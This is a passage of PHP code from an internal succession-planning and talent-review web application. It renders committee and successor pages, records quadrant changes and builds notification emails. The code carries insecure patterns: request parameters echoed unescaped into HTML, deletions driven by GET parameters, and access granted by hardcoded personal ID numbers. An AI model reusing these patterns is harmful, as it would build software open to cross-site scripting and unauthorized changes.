    //echo "perfil $perfil";
    $saveform = ($_GET["saveform"]);

    if ($saveform == "sf") {
        $nuevo_cuadrante = $_POST["nuevo_cuadrante"];
        $comentario = $_POST["comentario"];
        $id = $_POST["id"];
        $rut_col_sf = Decodear3($_POST["rut_col"]);
        //print_r($_POST);

        if ($perfil == "LIDER") {
            //Potencial_comite_update_tbl_data_bci_lider($nuevo_cuadrante, $comentario, $id_comite, $rut, $id, $id_empresa,$perfil, $rut_col_sf);
        } else {
            //Potencial_comite_update_tbl_data_bci_socio($nuevo_cuadrante, $comentario, $id_comite, $rut, $id, $id_empresa,$perfil, $rut_col_sf);
        }
        if ($nuevo_cuadrante == "10") {
            $nuevo_cuadrante = "5+";
        }
        $array_usu = Potencial_BuscaColaborador($id, $id_empresa);
        //print_r($array_usu);
        $datos_colaborador = UsuarioEnBasePersonas($array_usu[0]->rut, $rutcontodo);
        $datos_lider = UsuarioEnBasePersonas($array_usu[0]->rut_lider, $rutcontodo);
        $datos_usuario = UsuarioEnBasePersonas($rut, $rutcontodo);
        $datos_socio = UsuarioEnBasePersonas($array_usu[0]->rut_socio, $rutcontodo);
        //print_r($datos_colaborador);
        if ($perfil == "SOCIO DE NEGOCIO") {

            $template_correo = "template_potencial";
            $tipo = "";
            $datos_usuario = mp_buscaDATOSPERSONAS($rut, $id_empresa);
            $titulo1 = "Has modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subject = "Has modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subtitulo1 = "Estimado(a) " . $datos_usuario[0]->nombre_completo . "<br> <br>Has modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo . ", que pertenece al lider " . $datos_lider[0]->nombre_completo . "";
            $texto1 = "<br> Nuevo Cuadrante: " . $nuevo_cuadrante . "<br>Comentario: " . ($comentario);
            $texto2 = "";
            $texto4 = "";
            $texto3 = "";
            $tipomensaje = "PotencialBci";
            $rut = $datos_usuario[0]->rut;
            $key = $datos_usuario[0]->rut;
            $to = $datos_usuario[0]->email;
            $nombreto = ($datos_usuario[0]->nombre_completo);
            $to = ($datos_usuario[0]->email);
            //SendGrid_Email($to, $nombreto, $from, $nombrefrom, $tipo, $subject, $titulo1, $subtitulo1, $texto1, $url, $texto_url, $texto2, $texto3, $texto4, $logo, $id_empresa, $url, $tipomensaje, $rut, $key,$template_correo);

            $template_correo = "template_potencial";
            $tipo = "";
            $datos_usuario = mp_buscaDATOSPERSONAS($rut, $id_empresa);
            $titulo1 = "Han modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subject = "Han modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subtitulo1 = "Estimado(a) " . $datos_lider[0]->nombre_completo . "<br> <br>El Socio de Negocio " . $datos_usuario[0]->nombre_completo . ", ha modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo . "";
            $texto1 = "<br> Nuevo Cuadrante: " . $nuevo_cuadrante . "<br>Comentario: " . ($comentario);
            $texto2 = "";
            $texto4 = "";
            $texto3 = "";
            $tipomensaje = "PotencialBci";
            $rut = $datos_usuario[0]->rut;
            $key = $datos_usuario[0]->rut;
            $to = $datos_usuario[0]->email;
            $nombreto = ($datos_lider[0]->nombre_completo);
            $to = ($datos_lider[0]->email);
            //SendGrid_Email($to, $nombreto, $from, $nombrefrom, $tipo, $subject, $titulo1, $subtitulo1, $texto1, $url, $texto_url, $texto2, $texto3, $texto4, $logo, $id_empresa, $url, $tipomensaje, $rut, $key,$template_correo);

        }
        if ($perfil == "LIDER") {
            $template_correo = "template_potencial";
            $tipo = "";
            $datos_usuario = mp_buscaDATOSPERSONAS($rut, $id_empresa);
            $titulo1 = "Has modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subject = "Has modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subtitulo1 = "Estimado(a) " . $datos_usuario[0]->nombre_completo . "<br> <br>Has modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo . "";
            $texto1 = "<br> Nuevo Cuadrante: " . $nuevo_cuadrante . "<br>Comentario: " . ($comentario);
            $texto2 = "";
            $texto4 = "";
            $texto3 = "";
            $tipomensaje = "PotencialBci";
            $rut = $datos_usuario[0]->rut;
            $key = $datos_usuario[0]->rut;
            $to = $datos_usuario[0]->email;
            $nombreto = ($datos_usuario[0]->nombre_completo);
            $to = ($datos_usuario[0]->email);
            //SendGrid_Email($to, $nombreto, $from, $nombrefrom, $tipo, $subject, $titulo1, $subtitulo1, $texto1, $url, $texto_url, $texto2, $texto3, $texto4, $logo, $id_empresa, $url, $tipomensaje, $rut, $key,$template_correo);

            $template_correo = "template_potencial";
            $tipo = "";
            $datos_usuario = mp_buscaDATOSPERSONAS($rut, $id_empresa);
            $titulo1 = "Han modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subject = "Han modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subtitulo1 = "Estimado(a) " . $datos_socio[0]->nombre_completo . "<br> <br>El Lider " . $datos_lider[0]->nombre_completo . ", ha modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo . "";
            $texto1 = "<br> Nuevo Cuadrante: " . $nuevo_cuadrante . "<br>Comentario: " . ($comentario);
            $texto2 = "";
            $texto4 = "";
            $texto3 = "";
            $tipomensaje = "PotencialBci";
            $rut = $datos_usuario[0]->rut;
            $key = $datos_usuario[0]->rut;
            $to = $datos_usuario[0]->email;
            $nombreto = ($datos_socio[0]->nombre_completo);
            $to = ($datos_socio[0]->email);
            //SendGrid_Email($to, $nombreto, $from, $nombrefrom, $tipo, $subject, $titulo1, $subtitulo1, $texto1, $url, $texto_url, $texto2, $texto3, $texto4, $logo, $id_empresa, $url, $tipomensaje, $rut, $key,$template_correo);

        }
    }
    $PRINCIPAL = (FuncionesTransversales(file_get_contents("views/sucesion/sucesion_comite.html")));
    $id_comite = Decodear3($_GET["id_comite"]);
    if ($perfil == "SOCIO DE NEGOCIO") {
        $boton_subir_colaboradores = "
				        <div class='alert alert-gris'>
										<div class='titulo-heading'><img src='https://www.paneldeliderazgobci.cl/front/img/widget-link.png'> Subir Colaboradores a ser mapeados</div>

				            <form name='importa' method='post' action='?sw=potencial_save_colaboradores' id='importa' enctype='multipart/form-data'>
				                <div class=''>


				                <a href='https://www.potencialbci.cl/front/docs/subir_colaboradores.xlsx?v2'
				                class='btn btn-link' style='    color: #007cc6;background: #d9edf7;'>Descargar Plantilla</a>

				                        <p> <center><input type='file' name='excel' style='display:inline;' />
				                             <button type='submit' class='btn btn-info ' style='display:inline;'>
				                    	<i class='fas fa-upload'></i> Subir Colaboradores
				                    </button>
				                    <input type='hidden' value='upload' name='action' /> </center></p>
				                    <input type='hidden' id='id_comite' name='id_comite' value='" . $id_comite . "' />

				                </div>
				            </form>

				        </div>

				                                ";
    } else {
        $boton_subir_colaboradores = "";
    }
    if ($rut == "17810781") {
        $boton_subir_colaboradores = "";
    }
    $PRINCIPAL = str_replace("{BOTON_SUBIR_NOMINA_COMITE_POTENCIAL}", $boton_subir_colaboradores, $PRINCIPAL);
    $PRINCIPAL = str_replace("{LIDER_COMITE}", ($array_comite[0]->nombre_completo), $PRINCIPAL);
    $PRINCIPAL = str_replace("{NOMBRE_COMITE}", ($array_comite[0]->nombre), $PRINCIPAL);
    $PRINCIPAL = str_replace("{NOMBRE_LIDER}", ($array_comite[0]->nombre_lider), $PRINCIPAL);
    $PRINCIPAL = str_replace("{CARGO_LIDER}", ($array_comite[0]->cargo_lider), $PRINCIPAL);
    $PRINCIPAL = str_replace("{POSICION_LIDER}", ($array_comite[0]->posicion_lider), $PRINCIPAL);
    $PRINCIPAL = str_replace("{R_LIDER}", ($array_comite[0]->r_lider), $PRINCIPAL);
    $rut_ssnn = LimpiaRutFront($array_comite[0]->d11);
    //echo "<br>-> $rut_ssnn";
    $UsuaSSNN = DatosUsuario_($rut_ssnn, $id_empresa);
    $PRINCIPAL = str_replace("{SSNN_NEGOCIO}", ($UsuaSSNN[0]->nombre_completo), $PRINCIPAL);
    $fechas_comite = DDYYMMM($array_comite[0]->fecha) . " - " . DDYYMMM($array_comite[0]->fecha_comite);
    $fechas_comite_txt = "Desde: " . DDYYMMM($array_comite[0]->fecha) . " - Hasta: " . DDYYMMM($array_comite[0]->fecha_comite);
    $PRINCIPAL = str_replace("{FECHA}", ($fechas_comite_txt), $PRINCIPAL);
    $Estado_Comite = SucesionEstadoTareaComite($id_comite, "comite", "", $array_comite[0]->fecha, $array_comite[0]->fecha_comite, "");
    $PRINCIPAL = str_replace("{ESTADO_COMITE}", ($Estado_Comite), $PRINCIPAL);
    $estado = "<div class='badge badge-info'>ESTADO</div>";
    $PRINCIPAL = str_replace("{PERIODO_TAREA}", ($fechas_comite), $PRINCIPAL);
    $PRINCIPAL = str_replace("{ESTADO_TAREA}", ($estado), $PRINCIPAL);
    $PRINCIPAL = str_replace("{ID_COMITE_ENC}", $_GET["id_comite"], $PRINCIPAL);
    if ($_SESSION["user_"] == $array_comite[0]->rut or $_SESSION["user_"] == "10365815") {
        if ($array_comite[0]->comite_cerrado <> "SI") {
            $boton_cierra_SN = "
						<center style='float: right;'>
							<form name='potencial_comite_cerrar' id='potencial_comite_cerrar' action='?sw=potencial_sucesion_comite&id_comite=" . Encodear3($id_comite) . "&CC=1' method='post'>
								<input type='submit' class='btn btn-danger' value='Cerrar el Comité' style='padding-bottom: 3px;padding-top: 3px;'> <input type='checkbox' class='' name='email_lider' id='email_lider'> Chequea aquí si quieres enviar email a Líderes 
							</form>
						</center>
						<br>";
        } else {
            $boton_cierra_SN = "";
        }
    } else {
        $boton_cierra_SN = "";
    }

    $PRINCIPAL = str_replace("{POTENCIAL_CIERRE_POTENCIAL_SN}", $boton_cierra_SN, $PRINCIPAL);

    if ($array_comite[0]->comite_cerrado == "SI") {
        $alert_comite_cerrado = "<br><br><center><div class='alert alert-danger'>Comité Cerrado</div></center>";
    } else {
        $alert_comite_cerrado = "";
    }
    //echo "perfil $perfil";
    $PRINCIPAL = str_replace("{COMITE_CERRADO}", $alert_comite_cerrado, $PRINCIPAL);
    $PRINCIPAL = Potencial_Sucesion_Colaboradores_Comites_2024($PRINCIPAL, $id_comite, $rut, $perfil, $id_empresa);
    $boxfiltro = ($_GET["boxfiltro"]);
    $Usu = DatosUsuario_($rut, $id_empresa);

    $avatar = $Usu[0]->avatar_usuario;
    //$avatar = str_replace("s96-c",      "s180-c",           $avatar);
    //echo "avatar $avatar";
    if ($avatar == "") {
        $avatar = "https://www.potencialbci.cl/front/img/sinfoto.png";
    }
    $PRINCIPAL = str_replace("{AVATAR_COLABORADOR}", $avatar, $PRINCIPAL);
    $PRINCIPAL = str_replace("{NOMBRE_COLABORADOR}", ($Usu[0]->nombre_completo), $PRINCIPAL);
    $PRINCIPAL = str_replace("{RUT_COMPLETO}", $Usu[0]->rut_completo, $PRINCIPAL);
    $PRINCIPAL = str_replace("{PERFIL}", $perfil, $PRINCIPAL);
    $PRINCIPAL = ColocaDatosPerfil($PRINCIPAL, $rut);
    echo $PRINCIPAL;
}
else if ($seccion == "sucesion_ficha_sucesion") {

    $rut = $_SESSION["user_"];
    $id_empresa = $_SESSION["id_empresa"];
    Ficha_Acceso_SN_Sucesion_data($rut);

    $id_inst = ($_GET["id_inst"]);
    $profile = ($_GET["profile"]);
    $perfil = ($_GET["perfil"]);
    $rut_col = Decodear3($_REQUEST["rut_col"]);
    $id_comite_enc = ($_GET["id_comite"]);
    $id_comite = Decodear3($id_comite_enc);
    $id_posicion = Decodear3($_REQUEST["id_posicion_enc"]);
    $lider_2024 = Suc_buscaNombreDadoComitePosition($id_comite, $id_posicion);
    $array_comite = Potencial_Comites_Suc_data($id_comite, $id_empresa);
    $LiderSuc = Sucesion_Rut_Nombre_lider_posicion($id_posicion);
    if ($LiderSuc[0]->rut == $_SESSION["user_"]) {
        $soylider = 1;
    } else {
        $soylider = "";
    }
    $perfil = Decodear3($_GET["perfil"]);
    $delad = Decodear3($_GET["delad"]);
    if ($delad <> "") {
        Potencial_Delete_Acciones_Desarrollo($delad);
    }
    if ($_GET["close_posicion"] == 1) {
        Sucesion_Update_Cierre_Posicion_lider($id_posicion);
    }
    if ($_POST["plan_acciones_desarrollo"] <> "" and $_POST["rut_col_enc"] <> "") {
        $rut_enc_plan = Decodear3($_POST["rut_col_enc"]);
        Potencial_Insert_Acciones_Desarrollo($rut_enc_plan, $id_comite, $_POST["plan_acciones_desarrollo"], $_POST["fundamento"]);
    }
    if (Decodear3($_GET["del"]) <> "") {
        $rut_col_ed = Potencial_trae_rut_col_fromId_Sucesion_2024(Decodear3($_GET["del"]));
        Potencial_Insert_Col_Bitacora_Sucesion_CheckSave($rut, $perfil, $id_comite, $rut_col_ed, $_POST["fundamento"], "eliminado", $id_empresa);
        Potencial_Del_tbl_potencial_sucesion_colaboradores_propuestos_r2_2024(Decodear3($_GET["del"]), Decodear3($_GET["perfil_del"]));
    }
    if ($_POST["tipo_sucesion_ficha"] <> "") {
        $id_sucesor = Decodear3($_POST["id_sucesor"]);
        Potencial_Actualiza_tbl_potencial_sucesion_colaboradores_propuestos_r2_2024($id_sucesor, $_POST["tipo_sucesion_ficha"]);
        $rut_col_ed = Potencial_trae_rut_col_fromId_Sucesion($id_sucesor);
        Potencial_Insert_Col_Bitacora_Sucesion_CheckSave($rut, $perfil, $id_comite, $rut_col_ed, $_POST["fundamento"], "editado", $id_empresa);
    }
    if ($_GET["save"] == "1" or $_GET["save"] == "2" or $_GET["save"] == "3") {
        //    print_r($_POST);exit();
        if ($_GET["save"] == "1" and $_POST["nombre_externo_1"] <> "") {
            $nombre_externo = $_POST["nombre_externo_1"];
            $cargo_externo = $_POST["empresa_externo_1"];
        }
        if ($_GET["save"] == "2" and $_POST["nombre_externo_2"] <> "") {
            $nombre_externo = $_POST["nombre_externo_2"];
            $cargo_externo = $_POST["empresa_externo_2"];
        }
        if ($_GET["save"] == "3" and $_POST["nombre_externo_3"] <> "") {
            $nombre_externo = $_POST["nombre_externo_3"];
            $cargo_externo = $_POST["empresa_externo_3"];
        }
        $externo = 0;
        if ($_POST["nombre_externo_1"] <> "" or $_POST["nombre_externo_2"] <> "" or $_POST["nombre_externo_3"] <> "") {
            $rut_ficticio_usuario = DatosUsuarioMax();
            //echo "externo $rut_ficticio_usuario"; exit();
            PotencialInsertUsuario($rut_ficticio_usuario, $nombre_externo, $cargo_externo, $id_empresa);
            //echo "<br>-> $rut_colaborador";
            $rut_colaborador = $rut_ficticio_usuario;
            $externo = 1;
            //echo "<br>rut_colaborador $rut_colaborador";
        }
        $id_posicion_save = Decodear3($_GET["id_posicion_enc"]);
        $id_comite_save = Decodear3($_GET["id_comite"]);
        $tipo_temporalidad = $_GET["save"];
        if ($tipo_temporalidad == 1) {
            $rut_colaborador = Decodear3($_POST["rut_empresa_1"]);
            $fundamento = $_POST["fundamento_1"];
        }
        if ($tipo_temporalidad == 2) {
            $rut_colaborador = Decodear3($_POST["rut_empresa_2"]);
            $fundamento = $_POST["fundamento_2"];
        }
        if ($tipo_temporalidad == 3) {
            $rut_colaborador = Decodear3($_POST["rut_empresa_3"]);
            $fundamento = $_POST["fundamento_3"];
        }
        if ($rut_ficticio_usuario > 0) {
            $rut_colaborador = $rut_ficticio_usuario;
        }
        //echo "<br>2 rut_colaborador $rut_colaborador";
        $rut_colaborador = LimpiaRutFront($rut_colaborador);

        if ($externo == 1) {
            $CheckOk = 1;
        } else {
            $CheckOk = CheckValidateSucesionRut_2024($id_comite_save, $rut_colaborador, $lider_2024[0]->nivelR, $lider_2024[0]->rut);
        }
        if ($CheckOk == 1) {
            Potencial_Insert_Col_Sucesion_CheckSave_2024($id_comite_save, $rut_colaborador, $tipo_temporalidad, $id_posicion_save, $id_empresa, $fundamento);
            Potencial_Insert_Col_Bitacora_Sucesion_CheckSave_2024($id_comite, $rut_colaborador, $fundamento, "agregado", $id_empresa);
        }
        //echo "<br>3 rut_colaborador $rut_colaborador";
    }
    //$perfil =Potencial_Perfil_Usuarios($rut, $id_empresa);
    $saveform = ($_GET["saveform"]);
    $editBit = Decodear3($_POST["editBit"]);
    $delBit = Decodear3($_GET["delBit"]);
    //echo "editbit $editBit delbit $delBit";
    if ($editBit > 0) {
        Potencial_EliminaBitacora($editBit);
    }
    if ($delBit > 0) {
        Potencial_EliminaBitacora($delBit);
    }
    if ($saveform == "sf") {
        $nuevo_cuadrante = $_POST["nuevo_cuadrante"];
        $comentario = $_POST["comentario"];
        $id = $_POST["id"];
        $rut_col_sf = Decodear3($_POST["rut_col"]);
        if ($perfil == "LIDER") {
            Potencial_comite_update_tbl_data_bci_lider($nuevo_cuadrante, $comentario, $id_comite, $rut, $id, $id_empresa, $perfil, $rut_col_sf);
        } else {
            Potencial_comite_update_tbl_data_bci_socio($nuevo_cuadrante, $comentario, $id_comite, $rut, $id, $id_empresa, $perfil, $rut_col_sf);
        }
        if ($nuevo_cuadrante == "10") {
            $nuevo_cuadrante = "5+";
        }
        $array_usu = Potencial_BuscaColaborador($id, $id_empresa);
        //print_r($array_usu);
        $datos_colaborador = UsuarioEnBasePersonas($array_usu[0]->rut, $rutcontodo);
        $datos_lider = UsuarioEnBasePersonas($array_usu[0]->rut_lider, $rutcontodo);
        $datos_usuario = UsuarioEnBasePersonas($rut, $rutcontodo);
        $datos_socio = UsuarioEnBasePersonas($array_usu[0]->rut_socio, $rutcontodo);
        //print_r($datos_colaborador);
        if ($perfil == "SOCIO DE NEGOCIO") {
            $template_correo = "template_potencial";
            $tipo = "";
            $datos_usuario = mp_buscaDATOSPERSONAS($rut, $id_empresa);
            $titulo1 = "Has modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subject = "Has modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subtitulo1 = "Estimado(a) " . $datos_usuario[0]->nombre_completo . "<br> <br>Has modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo . ", que pertenece al lider " . $datos_lider[0]->nombre_completo . "";
            $texto1 = "<br> Nuevo Cuadrante: " . $nuevo_cuadrante . "<br>Comentario: " . ($comentario);
            $texto2 = "";
            $texto4 = "";
            $texto3 = "";
            $tipomensaje = "PotencialBci";
            $rut = $datos_usuario[0]->rut;
            $key = $datos_usuario[0]->rut;
            $to = $datos_usuario[0]->email;
            $nombreto = ($datos_usuario[0]->nombre_completo);
            $to = ($datos_usuario[0]->email);
            //SendGrid_Email($to, $nombreto, $from, $nombrefrom, $tipo, $subject, $titulo1, $subtitulo1, $texto1, $url, $texto_url, $texto2, $texto3, $texto4, $logo, $id_empresa, $url, $tipomensaje, $rut, $key,$template_correo);
            $template_correo = "template_potencial";
            $tipo = "";
            $datos_usuario = mp_buscaDATOSPERSONAS($rut, $id_empresa);
            $titulo1 = "Han modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subject = "Han modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subtitulo1 = "Estimado(a) " . $datos_lider[0]->nombre_completo . "<br> <br>El Socio de Negocio " . $datos_usuario[0]->nombre_completo . ", ha modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo . "";
            $texto1 = "<br> Nuevo Cuadrante: " . $nuevo_cuadrante . "<br>Comentario: " . ($comentario);
            $texto2 = "";
            $texto4 = "";
            $texto3 = "";
            $tipomensaje = "PotencialBci";
            $rut = $datos_usuario[0]->rut;
            $key = $datos_usuario[0]->rut;
            $to = $datos_usuario[0]->email;
            $nombreto = ($datos_lider[0]->nombre_completo);
            $to = ($datos_lider[0]->email);
            //SendGrid_Email($to, $nombreto, $from, $nombrefrom, $tipo, $subject, $titulo1, $subtitulo1, $texto1, $url, $texto_url, $texto2, $texto3, $texto4, $logo, $id_empresa, $url, $tipomensaje, $rut, $key,$template_correo);
        }
        if ($perfil == "LIDER") {
            $template_correo = "template_potencial";
            $tipo = "";
            $datos_usuario = mp_buscaDATOSPERSONAS($rut, $id_empresa);
            $titulo1 = "Has modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subject = "Has modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subtitulo1 = "Estimado(a) " . $datos_usuario[0]->nombre_completo . "<br> <br>Has modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo . "";
            $texto1 = "<br> Nuevo Cuadrante: " . $nuevo_cuadrante . "<br>Comentario: " . ($comentario);
            $texto2 = "";
            $texto4 = "";
            $texto3 = "";
            $tipomensaje = "PotencialBci";
            $rut = $datos_usuario[0]->rut;
            $key = $datos_usuario[0]->rut;
            $to = $datos_usuario[0]->email;
            $nombreto = ($datos_usuario[0]->nombre_completo);
            $to = ($datos_usuario[0]->email);
            //SendGrid_Email($to, $nombreto, $from, $nombrefrom, $tipo, $subject, $titulo1, $subtitulo1, $texto1, $url, $texto_url, $texto2, $texto3, $texto4, $logo, $id_empresa, $url, $tipomensaje, $rut, $key,$template_correo);
            $template_correo = "template_potencial";
            $tipo = "";
            $datos_usuario = mp_buscaDATOSPERSONAS($rut, $id_empresa);
            $titulo1 = "Han modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subject = "Han modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo;
            $subtitulo1 = "Estimado(a) " . $datos_socio[0]->nombre_completo . "<br> <br>El Lider " . $datos_lider[0]->nombre_completo . ", ha modificado el cuadrante de " . $datos_colaborador[0]->nombre_completo . "";
            $texto1 = "<br> Nuevo Cuadrante: " . $nuevo_cuadrante . "<br>Comentario: " . ($comentario);
            $texto2 = "";
            $texto4 = "";
            $texto3 = "";
            $tipomensaje = "PotencialBci";
            $rut = $datos_usuario[0]->rut;
            $key = $datos_usuario[0]->rut;
            $to = $datos_usuario[0]->email;
            $nombreto = ($datos_socio[0]->nombre_completo);
            $to = ($datos_socio[0]->email);
            //SendGrid_Email($to, $nombreto, $from, $nombrefrom, $tipo, $subject, $titulo1, $subtitulo1, $texto1, $url, $texto_url, $texto2, $texto3, $texto4, $logo, $id_empresa, $url, $tipomensaje, $rut, $key,$template_correo);
        }
    }
    $Ficha = Potencial_Colaboradores_Matriz_tbl_data_bci_data($id_empresa, $rut_col);
    //echo "Ficha[0]->d128 ".$Ficha[0]->d128;
    //echo "rut $rut_col";
    $es_posicion_clave = Pot_CheckPosicion_Clave($rut_col);
    if ($es_posicion_clave > 0) {
        $posicion_clave = " 
                                <div class=' col-lg-3'></div>
                                    <div class=' col-lg-6'>
                                        <div class='badge badge-gray'  style='    background-color: transparent !important;padding-left: 0px!important;'>
                                            <center>
                                                <strong>Posición Clave</strong>
                                            </center>
                                        </div>
                                    </div>
                                <div class=' col-lg-3'></div>
                                ";
    } else {
        $posicion_clave = "";
    }
    $Pot_NombreLider = "Lider: " . Potencial_Busca_Nombre_Lider($rut_col, $id_comite_enc);
    //echo "rut lider $RutLider";
    $PRINCIPAL = (FuncionesTransversales(file_get_contents("views/sucesion/ficha_sucesion.html")));
    //$perfil 			="USUARIO";
    // $perfil 			=	Potencial_Perfil_Usuarios($rut, $id_empresa);
    $PRINCIPAL = str_replace("{DISCLAIMER_BAJO_26}", $disclaimer, $PRINCIPAL);
    $PRINCIPAL = str_replace("{DATA_BCI_D20}", $Ficha[0]->d20, $PRINCIPAL);
    $PRINCIPAL = str_replace("{POSICION_CLAVE}", $posicion_clave, $PRINCIPAL);
    $PRINCIPAL = str_replace("{NOMBRE_LIDER}", $Pot_NombreLider, $PRINCIPAL);
    $PRINCIPAL = str_replace("{PERFIL_ENC}", $_GET["perfil"], $PRINCIPAL);


    $PRINCIPAL = Potencial_Sucesion_Colaboradores_Comites_Ficha_2024($PRINCIPAL, $id_comite, $rut, $perfil, $id_posicion, $id_empresa);

    $PRINCIPAL = str_replace("{POSICION}", $id_posicion, $PRINCIPAL);
    $PRINCIPAL = str_replace("{NOMBRE_COLABORADOR_POSICION}", $lider_2024[0]->nombre_completo, $PRINCIPAL);
    $PRINCIPAL = str_replace("{NIVELR_COLABORADOR_POSICION}", $lider_2024[0]->nivelR, $PRINCIPAL);
    $PRINCIPAL = str_replace("{CARGO_COLABORADOR_POSICION}", $lider_2024[0]->colaborador_cargo, $PRINCIPAL);

    $PRINCIPAL = str_replace("{NOMBRE_LIDER_SUCESION}", $LiderSuc[0]->d7 . " " . $LiderSuc[0]->d8 . " " . $LiderSuc[0]->d9, $PRINCIPAL);
    $Usu = DatosUsuario_($rut, $id_empresa);
    $avatar = $Usu[0]->avatar_usuario;
    //$avatar = str_replace("s96-c",      "s180-c",           $avatar);
    //echo "avatar $avatar";
    if ($avatar == "") {
        $avatar = "https://www.potencialbci.cl/front/img/sinfoto.png";
    }
    $PRINCIPAL = str_replace("{AVATAR_COLABORADOR}", $avatar, $PRINCIPAL);
    $PRINCIPAL = str_replace("{NOMBRE_COLABORADOR}", ($Usu[0]->nombre_completo), $PRINCIPAL);
    $PRINCIPAL = str_replace("{RUT_COMPLETO}", $Usu[0]->rut_completo, $PRINCIPAL);
    $PRINCIPAL = str_replace("{PERFIL}", $perfil, $PRINCIPAL);
    $PRINCIPAL = ColocaDatosPerfil($PRINCIPAL, $rut);
    $PRINCIPAL = str_replace("{ID_POSICION_ENC}", $_GET["id_posicion_enc"], $PRINCIPAL);
    $PRINCIPAL = str_replace("{ID_COMITE}", $_GET["id_comite"], $PRINCIPAL);
    $PRINCIPAL = str_replace("{ENGAGEMENT_2019}", $Ficha[0]->d143, $PRINCIPAL);
    $PRINCIPAL = str_replace("{BOTON_CREAR_COMITE_POTENCIAL}", $boton_crear_comite, $PRINCIPAL);
    $PRINCIPAL = str_replace("{PERFIL}", $perfil, $PRINCIPAL);
    $PRINCIPAL = str_replace("{ID_COMITE_ENC}", $id_comite_enc, $PRINCIPAL);
    $comite_cerrado = $array_comite[0]->comite_cerrado;
    //echo "<br>comite_cerrado $comite_cerrado";
    if ($comite_cerrado == "SI") {
        $display_none_edit = " display:none;";
        $boton_ver_editar_box = "";
    } else {
        $display_none_edit = " ";
        if ($RutLider == $rut) {
            $boton_ver_editar_box = "<button type='button' class='btn btn-info' data-toggle='modal' data-target='#" . Encodear3($rut_col) . "'>
                            <span class='blanco'><i class='fas fa-edit'></i> Proponer Cuadrante</span></button>";

        } else {
            $boton_ver_editar_box = "<button type='button' class='btn btn-info' data-toggle='modal' data-target='#" . Encodear3($rut_col) . "'>
                            <span class='blanco'><i class='fas fa-edit'></i> Editar Cuadrante</span></button>";
        }
    }

    $PRINCIPAL = str_replace("{BOTON_VER_EDITAR_BOX}", $boton_ver_editar_box, $PRINCIPAL);
    $PRINCIPAL = str_replace("{RUT_COL_ENC}", Encodear3($rut_col), $PRINCIPAL);
    $lista = Potencial_Bitacora_Comites_FullRut_data($rut_col, $id_empresa);
    //print_r($lista);
    $posicion_validada = Sucesion_Check_Posicion_validada($id_posicion);
    if ($posicion_validada > 0) {
        $aprobar_cargo_lider .= "<br><center><div class='alert alert-success'>Propuesta de Sucesión Cerrada por Líder</div>";
    } else {
        $aprobar_cargo_lider .= "<br><center><div class='alert alert-warning'>Propuesta de Sucesión Pendiente Líder</div>";
        if ($soylider == "1") {
            $aprobar_cargo_lider .= "<br><a href='?sw=potencial_ficha_sucesion&close_posicion=1&id_posicion_enc=" . $_GET["id_posicion_enc"] . "=&id_comite=" . $_GET["id_comite"] . "&perfil=" . $_GET["perfil"] . "' class='btn btn-success'>Cierre de Propuesta de Sucesión</a> ";
        }
    }

    $PRINCIPAL = str_replace("{APROBAR_CARGO_LIDER}", $aprobar_cargo_lider, $PRINCIPAL);

    $num_comentarios = count($lista);
    //echo "<br>num_comites $num_comites<br>";
    if ($num_comentarios > 0) {
        $potencial_bitacora_titulo = "
    
                                <div class='panel panel-info'>	<div class='panel-heading'>Bit&aacute;cora</div>     <div class='panel-body'>
                                <div class=''>    <strong>   </strong></div>";
    } else {
        $potencial_bitacora_titulo = "
                                <div class='panel panel-info'>	<div class='panel-heading'>Bit&aacute;cora</div>     <div class='panel-body'>
                                <div class=''><div class=''><br>    <div class='col-sm-12 txt_title_pot_hohay'><center>[ No hay bit&aacute;cora de cuadrantes ]</center></div>
                                                        <br></div></div>
                                ";
    }
    $PRINCIPAL = str_replace("{TITULO_BITACORA}", $potencial_bitacora_titulo, $PRINCIPAL);
    $PRINCIPAL = str_replace("{MI_BITACORA}", $row_lsita, $PRINCIPAL);
    $perfil = Potencial_Perfil_Sucesion_Usuarios($rut, $id_empresa);
    //echo "<br>perfil $perfil";
    //SIEMPRE SE VerificaFotoPersonal
    $display_none_edit = "";
    if ($perfil == "SUPER USER") {
        $display_none_edit = "";
    }
    $PRINCIPAL = str_replace("{display_none_edit}", $display_none_edit, $PRINCIPAL);
    $PRINCIPAL = ColocaDatosPerfil($PRINCIPAL, $rut_col);
    echo $PRINCIPAL;
}

else if ($seccion == "BuscaPersonas2020_SucesorLider") {

    $rut = $_SESSION["user_"];
    Ficha_Acceso_SN_Sucesion_data($rut);

    $search = $_POST['search'];
    $busqueda = BuscaPersonas2020_SucesorLider($search);

    foreach ($busqueda as $bus) {

        $response[] = array(
            "value" => $bus->rut,
            "label" => ($bus->nombre_completo),
            "alerta_otro_lado" => $dato_oficina[0]->oficina,
            "alerta_2" => '<div class="alert alert-warning" role="alert">
							  This is a warning alert—check it out!
							</div>',
            "alerta_cargos_criticos" => 'Alerta Cargos Criticos');
    }
    echo json_encode($response);
    exit;
}
else if ($seccion == "sucesion_personas_ajax_vigentes") {

    $rut = $_SESSION["user_"];
    Ficha_Acceso_SN_Sucesion_data($rut);

    $personas = Fichas_Personas_Sucesion_Vigentes($_POST["text"]);
    $li = '';

    if (count($personas) > 0) {
        foreach ($personas as $em) {
            $novigente = ($em->vigente == "no_vigente") ? " (No Vigente)" : "";
